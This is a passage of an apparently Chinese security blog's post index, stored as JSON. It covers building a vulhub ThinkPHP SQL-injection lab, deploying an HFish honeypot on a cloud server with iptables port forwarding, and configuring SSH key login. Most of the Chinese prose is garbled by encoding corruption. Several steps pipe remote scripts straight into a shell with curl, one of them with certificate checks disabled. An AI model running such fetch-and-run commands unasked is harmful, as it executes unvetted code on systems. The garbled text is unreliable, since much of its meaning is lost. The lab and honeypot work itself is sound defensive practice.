ä¿®æ”¹è‡ªåŠ¨æç¤ºç›¸å…³çš„é…ç½®æ–‡ä»¶ï¼šZSH_AUTOSUGGEST_HIGHLIGHT_STYLE=&#39;fg=10&#39; 12vi zsh-autosuggestions.zshsource ~/.zshrc Ubuntu å¿«é€Ÿå¼€å¯ TCP BBR å®ç°é«˜æ•ˆå•è¾¹åŠ é€ŸLinux Kernel å†…æ ¸å‡çº§åˆ° 4.9 åŠä»¥ä¸Šç‰ˆæœ¬å¯ä»¥å®ç° BBR åŠ é€Ÿï¼Œç”±äºUbuntu 18.04 é»˜è®¤çš„å†…æ ¸å°±æ˜¯ 4.15ç‰ˆæœ¬çš„å†…æ ¸ã€‚ ç”±äºUbuntu 20.04 é»˜è®¤çš„å†…æ ¸å°±æ˜¯ 5.4 ç‰ˆæœ¬çš„å†…æ ¸ï¼Œå¹¶å·²ç»é»˜è®¤ç¼–è¯‘äº† TCP BBR æ¨¡å—ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥é€šè¿‡å‚æ•°å¼€å¯ã€‚æ–°çš„ TCP æ‹¥å¡æ§åˆ¶ç®—æ³• BBR (Bottleneck Bandwidth and RTT) å¯ä»¥è®©æœåŠ¡å™¨çš„å¸¦å®½å°½é‡è·‘æ…¢ã€‚å¹¶ä¸”å°½é‡ä¸è¦æœ‰æ’é˜Ÿçš„æƒ…å†µï¼Œè®©ç½‘ç»œæœåŠ¡æ›´ä½³ç¨³å®šå’Œé«˜æ•ˆã€‚ ä¿®æ”¹ç³»ç»Ÿå˜é‡ï¼š 12echo net.core.default_qdisc=fq &gt;&gt; /etc/sysctl.confecho net.ipv4.tcp_congestion_control=bbr &gt;&gt; /etc/sysctl.conf ä¿å­˜ç”Ÿæ•ˆ 1sysctl -p æ‰§è¡Œ 1sysctl net.ipv4.tcp_available_congestion_control å¦‚æœç»“æœæ˜¯è¿™æ · 12sysctl net.ipv4.tcp_available_congestion_controlnet.ipv4.tcp_available_congestion_control = bbr cubic reno å°±å¼€å¯äº†ã€‚æ‰§è¡Œ lsmod | grep bbr ï¼Œä»¥æ£€æµ‹ BBR æ˜¯å¦å¼€å¯ã€‚ vulhubé¶åœºæ­å»ºvulhubå®˜æ–¹å®‰è£… å®‰è£…docker-compose1234567891011# å®‰è£…pipcurl -s https://bootstrap.pypa.io/get-pip.py | python3# å®‰è£…æœ€æ–°ç‰ˆdockercurl -s https://get.docker.com/ | sh# å¯åŠ¨dockeræœåŠ¡systemctl start docker# å®‰è£…composepip install docker-compose é¶åœºçš„ä½¿ç”¨12345678910111213# ä¸‹è½½é¡¹ç›®wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zipunzip vulhub-master.zipcd vulhub-master# è¿›å…¥æŸä¸€ä¸ªæ¼æ´/ç¯å¢ƒçš„ç›®å½•cd thinkphp/in-sqlubjection# è‡ªåŠ¨åŒ–ç¼–è¯‘ç¯å¢ƒsudo docker-compose build# å¯åŠ¨æ•´ä¸ªç¯å¢ƒsudo docker-compose up -d æŸ¥çœ‹readme.mdï¼Œæ ¹æ®æŒ‡ç¤ºè®¿é—®é“¾æ¥ 1http://your-ip/index.php?ids[]=1&amp;ids[]=2 ç¯å¢ƒè¿è¡ŒæˆåŠŸ ä¸ºé¶åœºéƒ¨ç½²èœœç½ æ€è·¯ï¼šåœ¨ubuntuæœåŠ¡å™¨éƒ¨ç½²èœœç½ç®¡ç†ç«¯ï¼Œä¸ºdockeré¶åœºéƒ¨ç½²èŠ‚ç‚¹èœœç½ ç«¯å£è½¬å‘ æ€è·¯ï¼šhfishèœœç½çš„ç®¡ç†ç«¯éƒ¨ç½²åœ¨äº‘æœåŠ¡å™¨ä¸­ï¼Œéœ€è¦ä½¿ç”¨å†…ç½‘IPè®¿é—® https://10.0.20.15:4433/webï¼Œä½†ç”±äºåœ¨äº‘æœåŠ¡å™¨å†…è®¿é—®ç½‘é¡µä¸æ–¹ä¾¿ï¼Œæ‰€ä»¥æƒ³åˆ°ç”¨ç«¯å£è½¬å‘ï¼Œå°†å†…ç½‘çš„ç«¯å£æ˜ å°„åˆ°å…¬ç½‘ä¸Šï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡å¤–ç½‘å»è®¿é—®äº†ã€‚ æ‰“å¼€é˜²ç«å¢™ç«¯å£ 1sudo ufw allow [ç«¯å£]/tcp é‡è£…é˜²ç«å¢™ï¼Œä½¿ä¹‹ç”Ÿæ•ˆ 1sudo ufw reload ubuntuéƒ¨ç½²èœœç½ rootç”¨æˆ· 1bash &lt;(curl -sS -L https://hfish.io/webinstall.sh) iptables NATåŠŸèƒ½ ç”±äºlinuxä¸»æœºå‡ºäºå®‰å…¨è€ƒè™‘ï¼Œç³»ç»Ÿå‚æ•°&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forwardé»˜è®¤ä¸º0ï¼Œæ‰€ä»¥æ˜¯ç¦æ­¢NATåŠŸèƒ½çš„ ä¿®æ”¹é…ç½®æ–‡ä»¶ 1vim /etc/sysctl.conf æ‰¾åˆ°ä»¥ä¸‹ä¸¤è¡Œï¼Œæ‰“å¼€æ³¨é‡Šï¼Œå¹¶æŠŠ0æ”¹æˆ1 12net.ipv4.ip_forward = 1net.ipv6.ip_forward = 1 ä½¿é…ç½®ç”Ÿæ•ˆ 1sudo sysctl -p è½¬å‘é…ç½® 1iptables -t nat -A PREROUTING -p tcp -d [å…¬ç½‘ip] --dport [ç«¯å£4433] -j DNAT --to-destination [å†…ç½‘IPï¼šç«¯å£] 1iptables -t nat -A POSTROUTING -p tcp -s [å…¬ç½‘ip] --sport [ç«¯å£4433] -j SNAT --to-source [å…¬ç½‘ip] ä½¿é…ç½®æ°¸ä¹…ç”Ÿæ•ˆ 1sudo apt-get install iptables-persistent 12sudo netfilter-persistent savesudo netfilter-persistent reload åˆ é™¤é…ç½® åˆ—å‡ºè§„åˆ™ï¼ŒåŒ…æ‹¬åºå· 1iptables -t nat -L -n --line-numbers æ ¹æ®åºå·åˆ é™¤ï¼Œè¿™é‡Œå‡å¦‚å®ƒçš„åºå·æ˜¯1 1iptables -t nat -D PREROUTING 1 ç‰¹åˆ«é‡è¦çš„ä¸€ç‚¹ï¼å°±æ˜¯äº‘æœåŠ¡çš„é˜²ç«å¢™ä¼šæœ‰æ‹¦æˆªï¼ è¿›å…¥äº‘æœåŠ¡å™¨æ§åˆ¶å°ï¼Œæ·»åŠ ç«¯å£ æœ€åå°±å¯ä»¥æˆåŠŸåœ¨ç‰©ç†æœºä¸Šå»è®¿é—®äº‘æœåŠ¡å™¨é‡Œé¢éƒ¨ç½²çš„èœœç½äº†ï¼ˆå†…ç½‘https://10.0.20.15:4433/web å…¬ç½‘ https://81.x.x.x:4433/web) èœœç½æœåŠ¡å¼€å¯çš„ç«¯å£ï¼Œè…¾è®¯äº‘ä¹Ÿè¦æ‰“å¼€ï¼ åœ¨äº‘æœåŠ¡å™¨å†…ï¼Œç»™dockeréƒ¨ç½²èŠ‚ç‚¹èœœç½ä½¿dockerå¯ä»¥è®¿é—®ç‰©ç†æœº 1ip -4 route list match 0/0 | awk &#x27;&#123;print $3 &quot; host.docker.internal&quot;&#125;&#x27; &gt;&gt; /etc/hosts è¿™é‡Œæœ‰ä¸ªå‘ï¼Œå°±æ˜¯Hfishèœœç½ç»™å‡ºçš„èŠ‚ç‚¹ è¿™é‡Œæœ‰ä¸ªå‘ï¼Œå°±æ˜¯Hfishèœœç½ç»™å‡ºçš„èŠ‚ç‚¹ç®¡ç†æ˜¯4434ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸èƒ½è®¿é—®ï¼Œäºæ˜¯å°±æŠŠé…ç½®é‡Œå®ƒçš„4434æ”¹æˆäº†åˆ«çš„ç«¯å£ï¼Œå°±å¯ä»¥é¡ºåˆ©è®¿é—®äº†ã€‚ hfishçš„å®‰è£…è·¯å¾„ 12/usr/share/hfish/opt/hfish ä¿®æ”¹hfishçš„ç«¯å£ 12cd /usr/share/hfishvim config.toml åŒæ—¶è¦åœ¨äº‘æœåŠ¡å™¨çš„é˜²ç«å¢™ç®¡ç†å¤„ï¼Œæ·»åŠ 4435ç«¯å£ é‡å¯hfishèœœç½æœåŠ¡ 123ps -aux|grep hfish # æ‰¾åˆ°hfishkill [PID] # æ€æ‰è¿›ç¨‹ hfish-server/opt/hfish/hfish-server -d /opt/hfish/2.9.1 # å¼€å¯è¿›ç¨‹ è¿›å…¥dockerçš„bash 1docker exec -it [dockerçš„ID] bash æµ‹è¯•æ˜¯å¦å¯ä»¥è®¿é—®ç®¡ç†ç«¯çš„4435ç«¯å£ 1curl -k https://10.0.20.15:4435 è¿”å›äº†404notfoundï¼Œæ‰€ä»¥è®¿é—®æˆåŠŸ åœ¨äº‘æœåŠ¡ä¸Šæ­å»ºçš„èœœç½ç®¡ç†ç«¯ï¼Œç”ŸæˆèŠ‚ç‚¹ ç®¡ç†èŠ‚ç‚¹ï¼Œå¡«äº‘æœåŠ¡å™¨çš„å†…ç½‘IPï¼ˆå¯ä»¥å°±æ˜¯èœœç½ç®¡ç†ç«¯éƒ¨ç½²çš„é‚£ä¸ªIPï¼‰ åœ¨dockeré‡Œå®‰è£…èŠ‚ç‚¹ 1sh -c &quot;$(curl -k https://10.0.20.15:4435/tmp/bGnhE0WjjNo9.sh)&quot; ç¯å¢ƒæµ‹è¯• ç”¨ç‰©ç†æœºä¸Šè£…çš„kaliï¼Œæ‰«ä¸€ä¸‹äº‘æœåŠ¡å™¨ä¸Šçš„dockeré¶åœºã€‚é¢„æœŸæ•ˆæœï¼Œåº”è¯¥æ˜¯äº‘æœåŠ¡å™¨ä¸Šçš„èœœç½ç®¡ç†ç«¯ä¼šå‘Šè­¦æ­¤æ¬¡æ‰«æ å¤–éƒ¨å¯ä»¥è®¿é—®åˆ°dockeré¶åœºï¼Œhttp://81.70.247.200/index.php?ids[]=1&amp;ids[]=2ï¼Œå¹¶ä¸”å¼€å¯äº†80ç«¯å£ã€‚å°è¯•èœœç½å¼€å¯80ç«¯å£çš„èœœç½æœåŠ¡ï¼Œçœ‹ä¼šæœ‰ä»€ä¹ˆå˜åŒ–ã€‚ è¦æŠŠdockeré‡Œé¢çš„80ç«¯å£æ˜ å°„åˆ°å…¬ç½‘ï¼Œå¹¶ä¸”å…¬ç½‘çš„èœœç½æœåŠ¡ï¼Œè¦å…³é—­80ç«¯å£çš„æœåŠ¡ é…ç½®ç«¯å£æ˜ å°„ Docker IP æ˜¯172.22.0.3ã€‚å®¿ä¸»æœºIP æ˜¯10.0.15.20 æ˜ å°„ç«¯å£ï¼Œä½¿172.22.0.3çš„èœœç½æœåŠ¡ç«¯å£èƒ½å¤Ÿé€šè¿‡å…¬ç½‘IPè®¿é—®åˆ°ã€‚ docker-composeé…ç½®æ–‡ä»¶æ˜ å°„ï¼Œä½¿å¾—ç‰©ç†æœºå¯ä»¥è®¿é—®è¯¥ç«¯å£ï¼Œå†æ˜ å°„åˆ°å¤–ç½‘ èœœç½ç®¡ç†ç«¯å¼€å¯Arubaæ— çº¿APèœœç½ 9101ï¼Œdockerå†…è®¿é—®è¯¥èœœç½æœåŠ¡ï¼Œå¯ä»¥é¡ºåˆ©è®¿é—® 1curl -k https://172.22.0.3:9101 docker-composeé…ç½®ç«¯å£æ˜ å°„ dockeræ˜ å°„åˆ°å®¿ä¸»æœº 12cd /home/ubuntu/vulhub-master/thinkphp/in-sqlinjection/ # æ‰¾åˆ°dockeré¶åœºçš„è·¯å¾„vim docker-compose.yml é‡å¯æœåŠ¡ï¼ŒæŸ¥çœ‹ç«¯å£æ˜¯å¦æ˜ å°„æˆåŠŸ 123docker-compose downdocker-compose up -ddocker container ls -l dockerçš„IPå‘ç”Ÿäº†å˜åŒ–ï¼Œæ‰€ä»¥èŠ‚ç‚¹éœ€è¦é‡æ–°éƒ¨ç½² åœ¨èœœç½ç®¡ç†ç«¯ï¼Œç”Ÿæˆæ–°çš„è„šæœ¬ï¼Œåœ¨dockerçš„bashé‡Œé¢è¿è¡Œã€‚å­èŠ‚ç‚¹éƒ¨ç½²æˆåŠŸï¼Œç®¡ç†ç«¯é‡Œå¼€å¯9101çš„æœåŠ¡ æ¥ä¸‹æ¥ç”¨https://å…¬ç½‘IP:9101 https:// æœåŠ¡å™¨å†…ç½‘IP:9101 https://dockerIP:9101 éƒ½å¯ä»¥æ­£å¸¸è®¿é—®äº† åè®°ä¹‹å‰ä¸ºäº†ä¸é‚£ä¹ˆéš¾ï¼Œæ‰€ä»¥dockerçš„æœåŠ¡éƒ½æ˜ å°„å‡ºå»äº†ï¼Œåé¢å¯ä»¥å†æ¥ä¸€ä¸ªdockerï¼Œä¸å…¬å¼€æ˜ å°„å‡ºæ¥è¿™äº›ç«¯å£ï¼Œéœ€è¦æ”»å‡»æ–¹æ‹¿ä¸‹äº‘æœåŠ¡å™¨çš„bashï¼Œåœ¨åˆ©ç”¨äº‘æœåŠ¡å™¨ï¼Œå»è®¿é—®dockerï¼Œæ‰¾flagï¼Œè¿›è€Œè¿›è¡Œå†…ç½‘æ¸—é€ã€‚ å‚è€ƒæ–‡ç« https://blog.csdn.net/qm5132/article/details/83039405 å†…ç½‘æ¸—é€ä¸­çš„ç«¯å£è½¬å‘ dockerçš„ç½‘ç»œæ¨¡å¼ï¼šdockerè®¿é—®å®¿ä¸»æœº dockerè®¿é—®å®¿ä¸»æœº èœœç½çš„ä¸€äº›å‚è€ƒé“¾æ¥ https://blue.y1ng.org/0x7_honeypots/ https://www.freebuf.com/sectool/190840.html%C2%A0T-Pot https://www.pa55w0rd.online/hfish-web/ https://www.freebuf.com/vuls/289282.html https://github.com/hacklcx/HFish https://hfish.io/#/2-2-linux https://jocatw.github.io/2020/11/08/Hfish%E8%9C%9C%E7%BD%90%E6%90%AD%E5%BB%BA%E4%B8%8E%E4%BD%BF%E7%94%A8/ https://github.com/paralax/awesome-honeypots/blob/master/README_CN.md#honeypots https://sosly.me/index.php/2018/03/22/jymiguan7/ http://pirogue.org/2019/01/15/opencanary_2/ https://github.com/p1r06u3/opencanary_web https://zhuanlan.zhihu.com/p/110886405","categories":[{"name":"æ”»é˜²æ¨¡æ‹Ÿ","slug":"æ”»é˜²æ¨¡æ‹Ÿ","permalink":"https://gryffinbit.top/categories/%E6%94%BB%E9%98%B2%E6%A8%A1%E6%8B%9F/"},{"name":"è“é˜Ÿ","slug":"æ”»é˜²æ¨¡æ‹Ÿ/è“é˜Ÿ","permalink":"https://gryffinbit.top/categories/%E6%94%BB%E9%98%B2%E6%A8%A1%E6%8B%9F/%E8%93%9D%E9%98%9F/"}],"tags":[{"name":"äº‘æœåŠ¡å™¨","slug":"äº‘æœåŠ¡å™¨","permalink":"https://gryffinbit.top/tags/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"åº”æ€¥å“åº”","slug":"åº”æ€¥å“åº”","permalink":"https://gryffinbit.top/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"name":"å…¥ä¾µæ’æŸ¥","slug":"å…¥ä¾µæ’æŸ¥","permalink":"https://gryffinbit.top/tags/%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/"},{"name":"Linux","slug":"Linux","permalink":"https://gryffinbit.top/tags/Linux/"}],"author":"Gryffinbit"},{"title":"å†…ç½‘æ¸—é€ç«¯å£è½¬å‘","slug":"å†…ç½‘æ¸—é€ç«¯å£è½¬å‘","date":"2022-03-23T19:04:18.000Z","updated":"2024-11-12T07:00:08.000Z","comments":true,"path":"2022/03/24/å†…ç½‘æ¸—é€ç«¯å£è½¬å‘/","permalink":"https://gryffinbit.top/2022/03/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/","excerpt":"","text":"å®Œæ•´ç‰ˆ è§å¦ä¸€ç¯‡blogäº‘æœåŠ¡å™¨éƒ¨ç½²é¶åœº ç«¯å£è½¬å‘ æ€è·¯ï¼šhfishèœœç½çš„ç®¡ç†ç«¯éƒ¨ç½²åœ¨äº‘æœåŠ¡å™¨ä¸­ï¼Œéœ€è¦ä½¿ç”¨å†…ç½‘IPè®¿é—® https://10.0.20.15:4433/webï¼Œä½†ç”±äºåœ¨äº‘æœåŠ¡å™¨å†…è®¿é—®ç½‘é¡µä¸æ–¹ä¾¿ï¼Œæ‰€ä»¥æƒ³åˆ°ç”¨ç«¯å£è½¬å‘ï¼Œå°†å†…ç½‘çš„ç«¯å£æ˜ å°„åˆ°å…¬ç½‘ä¸Šï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡å¤–ç½‘å»è®¿é—®äº†ã€‚ æ‰“å¼€é˜²ç«å¢™ç«¯å£ 1sudo ufw allow [ç«¯å£]/tcp é‡è£…é˜²ç«å¢™ï¼Œä½¿ä¹‹ç”Ÿæ•ˆ 1sudo ufw reload iptables NATåŠŸèƒ½ ç”±äºlinuxä¸»æœºå‡ºäºå®‰å…¨è€ƒè™‘ï¼Œç³»ç»Ÿå‚æ•°&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forwardé»˜è®¤ä¸º0ï¼Œæ‰€ä»¥æ˜¯ç¦æ­¢NATåŠŸèƒ½çš„ ä¿®æ”¹é…ç½®æ–‡ä»¶ æ‰¾åˆ°ä»¥ä¸‹ä¸¤è¡Œï¼Œæ‰“å¼€æ³¨é‡Šï¼Œå¹¶æŠŠ0æ”¹æˆ1 12net.ipv4.ip_forward = 1net.ipv6.ip_forward = 1 ä½¿é…ç½®ç”Ÿæ•ˆ 1sudo sysctl -p è½¬å‘é…ç½® 1iptables -t nat -A PREROUTING -p tcp -d [å…¬ç½‘ip] --dport [ç«¯å£] -j DNAT --to-destination [å†…ç½‘IPï¼šç«¯å£] 1iptables -t nat -A POSTROUTING -p tcp -s [å…¬ç½‘ip] --sport [ç«¯å£] -j SNAT --to-source [å…¬ç½‘ip] ä½¿é…ç½®æ°¸ä¹…ç”Ÿæ•ˆ 1netfilter-persistent save ç‰¹åˆ«é‡è¦çš„ä¸€ç‚¹ï¼å°±æ˜¯äº‘æœåŠ¡çš„é˜²ç«å¢™ä¼šæœ‰æ‹¦æˆªï¼ è¿›å…¥äº‘æœåŠ¡å™¨æ§åˆ¶å°ï¼Œæ·»åŠ ç«¯å£ æœ€åå°±å¯ä»¥æˆåŠŸåœ¨ç‰©ç†æœºä¸Šå»è®¿é—®äº‘æœåŠ¡å™¨é‡Œé¢éƒ¨ç½²çš„èœœç½äº†ï¼ˆå†…ç½‘https://10.0.20.15:4433/web å…¬ç½‘ https://81.x.x.x:4433/web)","categories":[{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"å†…ç½‘æ¸—é€","slug":"æ¸—é€æµ‹è¯•/å†…ç½‘æ¸—é€","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"å†…ç½‘æ¸—é€","slug":"å†…ç½‘æ¸—é€","permalink":"https://gryffinbit.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}],"author":"Gryffinbit"},{"title":"å…³äºsshå¯†é’¥è®¤è¯ä¸€ä¸ªå¥½ç©çš„äº‹æƒ…","slug":"å…³äºsshå¯†é’¥è®¤è¯ä¸€ä¸ªå¥½ç©çš„äº‹æƒ…","date":"2022-03-21T22:48:45.000Z","updated":"2024-11-12T07:00:15.000Z","comments":true,"path":"2022/03/22/å…³äºsshå¯†é’¥è®¤è¯ä¸€ä¸ªå¥½ç©çš„äº‹æƒ…/","permalink":"https://gryffinbit.top/2022/03/22/%E5%85%B3%E4%BA%8Essh%E5%AF%86%E9%92%A5%E8%AE%A4%E8%AF%81%E4%B8%80%E4%B8%AA%E5%A5%BD%E7%8E%A9%E7%9A%84%E4%BA%8B%E6%83%85/","excerpt":"","text":"å‰è¨€äº‹æƒ…æ˜¯è¿™æ ·çš„ï¼Œæˆ‘æäº†ä¸€ä¸ªè…¾è®¯çš„äº‘æœåŠ¡å™¨ï¼Œsshè¿œç¨‹ç™»å½•çš„æ—¶å€™é‡‡ç”¨pubkeyAuthenticationã€‚å¼€å§‹çš„ç³»ç»Ÿæ˜¯debian11ï¼Œåæ¥æ¢æˆäº†ubuntuã€‚sshè¿œç¨‹ç™»å½•çš„æ—¶å€™ä¹ æƒ¯æ€§çš„rootç™»å½•ï¼Œç»“æœubuntuçš„æ—¶å€™ï¼Œå°±ä¼šæŠ¥é”™Permission denied (publickey). æˆ‘å¾ˆè¿·æƒ‘ï¼Œsshæ–‡ä»¶å¤¹ç»™çš„700æƒé™ï¼Œkeyç»™çš„400æƒé™ï¼Œubuntué…ç½®æ–‡ä»¶/etc/ssh/sshd_configä¹Ÿæ”¹äº†è®¤è¯æ–¹å¼ï¼Œä¸ºä»€ä¹ˆä¼šè®¤è¯ä¸è¿‡ã€‚ä½†æ˜¯å¦‚æœç”¨å¯†ç è®¤è¯ï¼Œrootç™»å½•å°±å¯ä»¥è¾“å…¥å¯†ç æ­£å¸¸ç™»å½•ã€‚ æœ€åæ’æŸ¥ï¼Œå‘ç°äº†å¥½ç©çš„äº‹æƒ…ã€‚ è…¾è®¯äº‘çš„ubuntuç™»å½•ï¼Œé»˜è®¤æ˜¯ç”¨ubuntuç™»å½•ï¼Œè€Œä¸æ˜¯rootï¼Œå¦‚æœæ˜¯ç”¨rootç™»å½•å°±ä¼šå¤±è´¥ ä»¥ä¸‹æ˜¯è…¾è®¯äº‘SSHè®¤è¯çš„å…·ä½“æµç¨‹ SSHå¯†é’¥è®¤è¯æ­¥éª¤ è¿›å…¥åˆ°è…¾è®¯äº‘çš„æ§åˆ¶å°ï¼Œåˆ›å»ºå¯†é’¥ï¼Œå¹¶ç»‘å®šåˆ°æœåŠ¡å™¨ åˆ›å»ºæˆåŠŸåï¼Œä¼šè‡ªåŠ¨ä¸‹è½½ç§é’¥ï¼Œè¿™ä¸ªç§é’¥åªæœ‰ä¸€æ¬¡ä¸‹è½½æœºä¼šï¼ŒåŠ¡å¿…å°å¿ƒä¿å­˜ã€‚ä¸‹è½½å¥½åæ”¾è¿›sshæ–‡ä»¶å¤¹ã€‚ï¼ˆåœ¨macOSç³»ç»Ÿä¸Šè·¯å¾„ä¸º &#x2F;Users&#x2F;username&#x2F;.sshï¼‰ å°†åˆšåˆšä¸‹è½½çš„å¯†é’¥æ–‡ä»¶èµ‹äºˆ400æƒé™ 1chmod 400 /Users/[ç”¨æˆ·å]/.ssh/[ç§é’¥] ps: .sshæ–‡ä»¶å¤¹å¯ä»¥èµ‹äºˆ700ã€755ã€600æƒé™ é€šè¿‡æ§åˆ¶å°è¿›å…¥åˆ°æœåŠ¡å™¨bashï¼Œä¿®æ”¹é…ç½®æ–‡ä»¶ ubuntué»˜è®¤å¯†ç æ˜¯éšæœºçš„ï¼Œ å¼€å§‹å¯ä»¥å…ˆè‡ªå·±é…ç½®ä¸€ä¸ªå¯†ç  1sudo passwd è¿›å…¥rootï¼Œä¿®æ”¹é…ç½®æ–‡ä»¶ 12su rootvim /etc/ssh/sshd_config æ‰¾åˆ°PasswordAuthentication æ‰“å¼€æ³¨é‡Šï¼ˆåˆ é™¤#ï¼‰ï¼Œå¹¶æŠŠåé¢æ”¹æˆno æ‰¾åˆ°PubkeyAuthentication æ‰“å¼€æ³¨é‡Šï¼ˆåˆ é™¤#ï¼‰ï¼Œå¹¶æŠŠåé¢æ”¹æˆyes æ‰¾åˆ°PermitRootLogin æ‰“å¼€æ³¨é‡Šï¼ˆåˆ é™¤#ï¼‰ï¼Œå¹¶æŠŠåé¢æ”¹æˆyes æŠ¥é”™å¹¶é€€å‡º æœåŠ¡å™¨é‡å¯sshæœåŠ¡ 1service sshd restart ç‰©ç†æœºè¿œç¨‹ç™»å½• 1ssh -i /Users/[username]/.ssh/[å¯†é’¥] ubuntu@[æœåŠ¡å™¨å…¬ç½‘IP] æ³¨æ„ï¼å°±æ˜¯è¿™é‡Œï¼ç™»å½•çš„ç”¨æˆ·åæ˜¯ubuntuï¼","categories":[{"name":"æ‚ä¸ƒæ‚å…«","slug":"æ‚ä¸ƒæ‚å…«","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[{"name":"äº‘æœåŠ¡å™¨","slug":"äº‘æœåŠ¡å™¨","permalink":"https://gryffinbit.top/tags/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/"}],"author":"Gryffinbit"},{"title":"æ¨¡æ‹Ÿæ”»é˜²æ¼”ç»ƒä¸Šç¯‡ï¼Œè“æ–¹é¶åœºéƒ¨ç½²","slug":"æ¨¡æ‹Ÿæ”»é˜²æ¼”ç»ƒä¸Šç¯‡ï¼Œè“æ–¹é¶åœºéƒ¨ç½²","date":"2022-03-12T13:44:31.000Z","updated":"2024-11-12T07:00:10.000Z","comments":true,"path":"2022/03/12/æ¨¡æ‹Ÿæ”»é˜²æ¼”ç»ƒä¸Šç¯‡ï¼Œè“æ–¹é¶åœºéƒ¨ç½²/","permalink":"https://gryffinbit.top/2022/03/12/%E6%A8%A1%E6%8B%9F%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%8A%E7%AF%87%EF%BC%8C%E8%93%9D%E6%96%B9%E9%9D%B6%E5%9C%BA%E9%83%A8%E7%BD%B2/","excerpt":"","text":"æ¨¡æ‹Ÿæ”»é˜²æ¼”ç»ƒä¸Šç¯‡ï¼Œè“æ–¹é¶åœºéƒ¨ç½² ä»¥ä¸‹è¿™ç¯‡blogåªæ˜¯è®°å½•äº†å½“æ—¶åšè¿™äº›çš„ä¸€ä¸ªæ€è·¯ï¼Œä»¥åŠæ­å»ºçš„è¿‡ç¨‹ï¼Œä½†æœ€ç»ˆå®ç°çš„æ—¶å€™æœ‰ä¸€äº›éš¾ä»¥è§£å†³çš„é—®é¢˜ã€‚å› ä¸ºé‚£äº›dockeré¶åœºä¸æ”¯æŒARMæ¶æ„ï¼Œæ‰€ä»¥åæ¥æˆ‘åˆé‡‡ç”¨äº†å¦å¤–ä¸€ç§æ–¹å¼ï¼Œè¯¦æƒ…è§Blog æ¨¡æ‹Ÿæ”»é˜²æ¼”ç»ƒä¸­ç¯‡ å‰è¨€è®°å½•ä¸€æ¬¡å…¥ä¾µæ£€æµ‹&#x2F;åº”æ€¥å“åº”çš„å®æˆ˜æ”»å‡»ã€‚ å®æˆ˜æ€è·¯ï¼šç‰©ç†æœºç”¨dockeræ­æ¼æ´é¶åœºï¼Œè®©ç”·æœ‹å‹æ¥åšçº¢æ–¹æ”»å‡»ï¼Œä»–æ¥æ‰“dockeræ¼æ´é¶åœºï¼Œæˆ‘åœ¨dockeré‡Œé¢åšè“æ–¹çš„é˜²å®ˆä»¥åŠå…¥ä¾µæ£€æµ‹&#x2F;åº”æ€¥å“åº”ã€‚ æœŸé—´æˆ‘çš„è“é˜Ÿé˜²å®ˆï¼Œä¼šç”¨èœœç½æ¥è¿·æƒ‘å’Œæ£€æµ‹æ”»å‡»ã€‚ æ„Ÿè°¢ @Gryffinrab çš„å‹æƒ…å‡ºæ¼” é¶åœºæ­å»ºvulhubé¶åœºæ­å»ºåˆæ­¥ å‰æå·²ç»æœ‰dockerçš„å®‰è£… æ²¡æœ‰dockerç¯å¢ƒçš„å‚è€ƒå¦å¤–ä¸€ç¯‡blog sqlé¶åœºæ­å»ºï¼ˆå†…ç½®dockerçš„å®‰è£…æ­¥éª¤ï¼‰ 1pip3 install docker-compose ä¸‹è½½vulhub Vulhubæ˜¯ä¸€ä¸ªåŸºäºdockerå’Œdocker-composeçš„æ¼æ´ç¯å¢ƒé›†åˆï¼Œè¿›å…¥å¯¹åº”ç›®å½•å¹¶æ‰§è¡Œä¸€æ¡è¯­å¥å³å¯å¯åŠ¨ä¸€ä¸ªå…¨æ–°çš„æ¼æ´ç¯å¢ƒï¼Œè®©æ¼æ´å¤ç°å˜å¾—æ›´åŠ ç®€å•ï¼Œè®©å®‰å…¨ç ”ç©¶è€…æ›´åŠ ä¸“æ³¨äºæ¼æ´åŸç†æœ¬èº«ã€‚å®˜ç½‘åœ°å€ï¼šhttps://vulhub.org/ 1git clone https://github.com/phith0n/vulhub.git æŒ‡å®šåˆ°vulhubçš„è·¯å¾„ 1cd vulhub è¿›å…¥vulhubç›®å½•ï¼Œå¯ä»¥çœ‹åˆ°å¾ˆå¤šæµ‹è¯•ç¯å¢ƒç›®å½•ï¼Œæ¯ä¸ªç¯å¢ƒç›®å½•ä¸‹éƒ½æœ‰ç›¸åº”çš„è¯´æ˜æ–‡ä»¶ 12lscd struts2 è¿›å…¥æŸä¸€æ¼æ´çš„ç¯å¢ƒ 12lscd s2-007 ä¿®æ”¹docker-compose.ymlè¿›å…¥æ¼æ´æ‰€åœ¨æ–‡ä»¶å¤¹ï¼Œä¿®æ”¹docker-compose.yml 1vim docker-compose.yml å¢åŠ ä¸€è¡Œ 1privileged: true å› ä¸ºåé¢å¯åŠ¨dockerçš„æ—¶å€™ï¼Œéœ€è¦ç”¨åˆ°systemctlå‘½ä»¤ï¼Œè¦ç”¨è¿™ä¸€è¡Œæ¥èµ‹äºˆè¿™ä¸ªdockeré«˜æƒé™ è‡ªåŠ¨åŒ–ç¼–è¯‘ç¯å¢ƒ 1docker-compose build å¯åŠ¨æ•´ä¸ªç¯å¢ƒ 1docker-compose up -d ä¸ºé¶åœºéƒ¨ç½²docker 